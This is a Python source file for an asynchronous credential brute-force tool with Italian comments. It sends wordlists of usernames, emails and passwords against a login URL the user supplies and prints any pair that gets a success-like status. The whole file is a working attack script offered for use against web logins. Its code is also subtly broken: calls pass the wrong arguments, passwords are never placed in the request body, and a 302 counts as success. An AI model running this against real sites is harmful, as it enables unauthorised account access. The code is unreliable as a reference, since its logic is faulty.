import asyncio
import httpx
import aiofiles
from .Options import headers,get_body  # Presumendo che 'Options' contenga intestazioni necessarie

import os

async def try_login(client, url, data):
    """Effettua una richiesta di login e restituisce la risposta."""
    return await client.post(url, headers=headers, data=data)

async def load_file(filename):
    """Carica le righe di un file e restituisce una lista di stringhe."""
    try:
        async with aiofiles.open(filename, "r", encoding="latin-1") as file:
            lista = [line.strip() for line in await file.readlines()]
            return lista  # Restituisci la lista di password
    except FileNotFoundError:
        print(f"Errore: il file {filename} non esiste.")
        return []

async def attempt_login(client, url, data):
    """Tenta di effettuare il login con un identificatore e una password."""
    response = await try_login(client, url, data)
    # Gestisci i vari status code che indicano un login riuscito
    if response.status_code in [200, 201, 204, 302]:
        return True
    else:
        return False

async def login_with_provided_credentials(client, url, identifier,data, password, is_email):
    """Effettua il login con le credenziali fornite dall'utente."""
    success = await attempt_login(client, url,data)
    if success:
        print(f"Login riuscito con {'email' if is_email else 'username'}: {identifier} e password: {password}")
    return success

async def login_with_file_credentials(client, url, identifier, passwords,data, is_email):
    """Effettua login con tutte le password da un file."""
    for password in passwords:
        success = await attempt_login(client, url,data, is_email)
        if success:
            print(f"Login riuscito con {'email' if is_email else 'username'}: {identifier} e password: {password}")
            return True
    return False

async def startCredBruteForce():
    filename = "./BruteForceWebLogin/usernames.txt"
    if not os.path.isfile(filename):
        print(f"Il file {filename} non esiste nella directory corrente.")
        return

    """Funzione principale per gestire il login."""
    url = input("Inserisci l'URL/API di login: ")
    # Chiedi se usare il corpo di default
    use_default_body = input("Do you want to use the default body structure? (y/n): ").lower() == 'y'
    login_type = input("Vuoi effettuare il login con (1) Email o (2) Username? ")

    is_email = login_type == '1'
    identifier = input(f"Inserisci il {'tuo indirizzo email' if is_email else 'tuo username'}: ")
    has_password = input("Hai una password? (y/n): ").lower() == 'y'

    

    # Data structure for the request
    if use_default_body:
        # Usa il metodo get_body per ottenere il corpo predefinito
        data = get_body()

        # Aggiorna il corpo con l'identificatore e la password
        if is_email:
            data["email"] = identifier
        else:
            data["username"] = identifier

        if has_password:
            data["password"] = input("Inserisci la tua password: ")
        else:
            passwords = await load_file("./BruteForceWebLogin/passwords.txt")
            if not passwords:
                print("Il file delle password è vuoto.")
                return
    else:
        # Permetti all'utente di inserire manualmente la struttura del corpo
        body_struct = input("Enter the body structure (e.g., user=username&pass=password&restofvariables=value): ")
        
        # Parsing della struttura di input
        data = {}
        for pair in body_struct.split('&'):
            key, value = pair.split('=')
            data[key] = value

    # Esegui la richiesta con le credenziali inserite
    async with httpx.AsyncClient() as client:
        if has_password:
            await login_with_provided_credentials(client, url, identifier, data["password"], is_email)
        else:
            if is_email:
                emails = await load_file("./BruteForceWebLogin/mail.txt")
                for email in emails:
                    if await login_with_file_credentials(client, url, email, passwords,data, True):
                        return
            else:
                usernames = await load_file("./BruteForceWebLogin/usernames.txt")
                for username in usernames:
                    if await login_with_file_credentials(client, url, username, passwords,data, False):
                        return